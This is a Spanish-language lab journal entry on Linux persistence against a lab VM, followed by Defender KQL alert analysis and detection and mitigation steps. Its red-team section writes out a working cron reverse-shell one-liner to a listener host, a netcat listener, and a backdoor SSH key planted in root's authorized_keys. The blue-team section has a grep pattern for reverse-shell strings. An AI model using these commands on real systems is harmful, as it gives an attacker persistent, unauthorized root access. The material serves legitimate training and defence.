# Día 33 — Persistence: Cron & Startup + Defender Incidents & Alerts

**Fecha:** Mayo 2026  
**MITRE:** T1053.003, T1098.004  
**Target:** Ubuntu 192.168.1.96

---

## Teoría

### ¿Qué es Persistence?

Persistence es cualquier mecanismo que permite al atacante mantener acceso al sistema incluso después de reinicios, cambios de password o cierre de sesión.

```
Sin persistence:
Sistema reinicia → acceso perdido → hay que explotar de nuevo

Con persistence:
Sistema reinicia → backdoor ejecuta automáticamente → acceso restaurado
```

**Los 4 mecanismos más comunes en Linux:**

| Mecanismo | Cómo funciona | MITRE |
|-----------|--------------|-------|
| Cron job | Ejecuta comandos en intervalos programados | T1053.003 |
| SSH authorized_keys | Agrega llave SSH del atacante | T1098.004 |
| Startup script | Se ejecuta al iniciar el sistema | T1037 |
| Bashrc/.profile | Se ejecuta al abrir terminal | T1546.004 |

---

## Red Team

### Setup — Acceso root

```bash
ssh vboxuser@192.168.1.96
sudo su
# → root@Ubuntu-Victim
```

Durante el setup se encontró el archivo `/etc/sudoers` corrupto con entradas repetidas de `lowpriv` — residuo de días anteriores del lab. Se limpió y restauró:

```bash
cat > /etc/sudoers << 'EOF'
Defaults    env_reset
Defaults    mail_badpass
Defaults    secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
root ALL=(ALL:ALL) ALL
%sudo ALL=(ALL:ALL) ALL
vboxuser ALL=(ALL:ALL) ALL
EOF
visudo -c && echo "sudoers OK"
```

### Método 1 — Cron Job malicioso (T1053.003)

**¿Por qué cron para persistence?**

Cron ejecuta comandos automáticamente en intervalos programados. Un cronjob malicioso instalado como root se ejecuta cada minuto — restaurando el acceso aunque el atacante cierre la sesión o el sistema se reinicie.

**Instalación del cronjob:**

```bash
(crontab -l 2>/dev/null; echo "* * * * * bash -c 'bash -i >& /dev/tcp/192.168.1.132/5555 0>&1'") | crontab -
```

**Desglose del comando:**
- `crontab -l 2>/dev/null` — lista cronjobs existentes, descarta error si no hay ninguno
- `grep -v "5555"` — excluye entradas previas del mismo puerto (para updates)
- `| crontab -` — instala la lista completa incluyendo el nuevo cronjob
- `bash -c '...'` — necesario para que cron interprete las redirecciones correctamente

**Sintaxis cron:**
```
*  *  *  *  *   comando
│  │  │  │  │
│  │  │  │  └── día de la semana (0-7)
│  │  │  └───── mes (1-12)
│  │  └──────── día del mes (1-31)
│  └─────────── hora (0-23)
└────────────── minuto (0-59)
* = cualquier valor → ejecuta cada minuto
```

**Verificación:**
```bash
crontab -l | tail -3
# → * * * * * /opt/cleanup.sh       ← cronjob preexistente encontrado
# → * * * * * bash -c 'bash -i >& /dev/tcp/192.168.1.132/5555 0>&1'
```

**Hallazgo adicional:** se encontró `/opt/cleanup.sh` corriendo cada minuto como root — script existente potencialmente vulnerable a hijacking si tiene permisos de escritura.

**Verificación en logs:**
```bash
grep CRON /var/log/syslog | tail -5
# → CRON[10391]: (root) CMD (bash -c 'bash -i >& /dev/tcp/192.168.1.132/5555 0>&1')
```

**Listener en Kali:**
```bash
nc -lvnp 5555
# → connect to [192.168.1.132] from 192.168.1.96:36608
# → root@Ubuntu-Victim:~#
```

**PERSISTENCE VIA CRON ACTIVA** ✅ — shell de root cada minuto automáticamente.

**Nota sobre `bash -i` en cron:**

El primer payload `bash -i >& /dev/tcp/...` falló porque cron no tiene TTY interactiva. La solución fue envolver en `bash -c '...'` que crea un subshell capaz de manejar las redirecciones aunque el entorno no sea interactivo.

### Método 2 — SSH authorized_keys (T1098.004)

**¿Por qué SSH keys para persistence?**

SSH authorized_keys es más silencioso que cron — no genera tráfico de red periódico. Sobrevive incluso si el admin cambia la password de root. El acceso es inmediato y directo.

```
Cron          → reverse shell cada minuto → tráfico periódico ← más detectable
SSH keys      → acceso directo sin password → silencioso ← más difícil de detectar
```

**Generación del par de llaves en Kali:**

```bash
ssh-keygen -t rsa -b 4096 -f /tmp/backdoor_key -N ""
# → /tmp/backdoor_key      (privada — se queda en Kali)
# → /tmp/backdoor_key.pub  (pública — se planta en la víctima)
```

- `-t rsa` — algoritmo RSA, el más compatible
- `-b 4096` — 4096 bits, robusto
- `-N ""` — sin passphrase, acceso automático sin escribir password

**Plantar llave pública en el servidor (desde shell root via nc):**

```bash
mkdir -p /root/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2E...d2@D2" >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
chmod 700 /root/.ssh
```

**Cómo funciona SSH con llaves:**
```
Servidor tiene llave pública del atacante en authorized_keys
Atacante conecta con su llave privada
SSH verifica: ¿la privada corresponde a alguna pública autorizada? → sí → acceso sin password
```

**Verificación desde Kali:**
```bash
ssh -i /tmp/backdoor_key root@192.168.1.96
# → root@Ubuntu-Victim:~#
```

**PERSISTENCE VIA SSH KEY ACTIVA** ✅ — acceso root directo, inmediato, sin password.

### Comparación final de métodos

| | Cron Job | SSH authorized_keys |
|--|----------|-------------------|
| **Velocidad de acceso** | Hasta 1 minuto | Inmediato |
| **Tráfico de red** | Periódico (cada minuto) | Solo cuando se conecta |
| **Detección** | Más fácil — logs de cron, tráfico | Más difícil — solo en auth.log |
| **Supervivencia** | Sobrevive reinicios | Sobrevive reinicios + cambios de password |
| **Requisito** | Acceso a crontab | Acceso a ~/.ssh/authorized_keys |

---

## SC-200 — Defender Incidents & Alerts

### Panorama de alertas del tenant — últimos 7 días

```kql
AlertInfo
| where Timestamp > ago(7d)
| summarize Count = count() by Severity, Category
| sort by Count desc
```

**Resultado:**
```
Medium  Discovery          5783  ← dominante
High    Exfiltration         55  ← crítico
Medium  Exfiltration         37
Medium  SuspiciousActivity   24
Low     Exfiltration          9
Medium  InitialAccess         4
```

**Análisis:**

**Discovery con 5783 alertas** — reconocimiento masivo en el tenant. Podría ser un scanner automatizado o herramienta de enumeración. Un SOC Analyst investigaría la IP de origen inmediatamente.

**Exfiltration en High con 55 alertas** — combinado con Discovery sugiere un atacante que ya pasó de reconocimiento a robo de datos. La cadena:
```
Discovery (reconocimiento) → InitialAccess (entrada) → Exfiltration (robo)
```

### Investigación de alertas de Exfiltración High

```kql
AlertInfo
| where Timestamp > ago(7d)
| where Severity == "High" and Category == "Exfiltration"
| project Timestamp, Title, Severity
| sort by Timestamp desc
```

**Resultado — 55 alertas DLP:**
```
DLP policy (MonitoreoFugaDatos)    High
DLP policy (Monitoreo_fuga_datos)  High
DLP policy (Monitoreo de Fuga de)  High
DLP policy (AVOID DLP 7) matched   High
```

**Concepto SC-200 — DLP (Data Loss Prevention):**

DLP es parte de **Microsoft Purview** integrado con Defender XDR. Detecta cuando información sensible intenta salir de la organización via email, Teams, OneDrive, SharePoint.

Cuando una política DLP dispara, genera una alerta de categoría **Exfiltration** en el portal — aunque sea un usuario interno el que mueve los datos.

**Insider Threat:** estas alertas no son de un atacante externo — son de usuarios internos potencialmente exfiltrando datos. El tenant tiene políticas DLP activas y están disparando constantemente — señal de que hay actividad de fuga de datos interna.

**Diferencia entre Exfiltración externa vs interna:**

| | Externa (atacante) | Interna (insider) |
|--|-------------------|------------------|
| **Vector** | Reverse shell, C2, FTP | Email, USB, OneDrive personal |
| **Detección** | EDR, firewall, IDS | DLP policies |
| **En Defender** | AlertInfo Category: Exfiltration (EDR) | AlertInfo Category: Exfiltration (DLP) |
| **Respuesta** | Aislar dispositivo | Investigar usuario, bloquear acción |

---

## Blue Team

### Detección de Persistence

**Cron jobs maliciosos:**
```bash
# Revisar crontabs de todos los usuarios
for user in $(cut -f1 -d: /etc/passwd); do
  crontab -u $user -l 2>/dev/null
done

# Buscar reverse shells en crontabs
grep -r "dev/tcp\|nc\|bash -i" /var/spool/cron/ /etc/cron*
```

**SSH authorized_keys sospechosas:**
```bash
# Buscar authorized_keys en todo el sistema
find / -name "authorized_keys" 2>/dev/null -exec cat {} \;

# Verificar últimas modificaciones
find /root /home -name "authorized_keys" -newer /etc/passwd
```

**KQL para detectar persistence en Defender:**
```kql
AlertInfo
| where AttackTechniques contains "T1053" or AttackTechniques contains "T1098"
| project Timestamp, Title, Severity, AttackTechniques
| sort by Timestamp desc
```

### Mitigación

- **Auditar crontabs regularmente** — especialmente los de root
- **File Integrity Monitoring** en `/root/.ssh/authorized_keys` y `/etc/cron*`
- **Restringir acceso a crontab** — solo usuarios autorizados via `/etc/cron.allow`
- **Monitorear auth.log** — logins con llave SSH desde IPs no conocidas
- **Principle of least privilege** — root no debería tener SSH habilitado en producción
- **`PermitRootLogin no`** en `/etc/ssh/sshd_config` — deshabilitar login directo como root

---

## Conclusión

El Día 33 demostró dos métodos de persistence complementarios: cron job para reverse shell automática y SSH authorized_keys para acceso directo silencioso. La diferencia clave es el perfil de detección — cron genera tráfico periódico fácil de detectar con análisis de red, mientras que SSH keys solo aparecen en auth.log cuando el atacante se conecta activamente. El hallazgo del `/opt/cleanup.sh` preexistente como cronjob de root es un vector adicional de escalación si el archivo tiene permisos de escritura para usuarios no privilegiados. En SC-200 se analizaron alertas reales del tenant revelando 5783 alertas de Discovery y 55 de Exfiltración High — todas DLP, indicando actividad de Insider Threat con políticas de fuga de datos disparando continuamente.
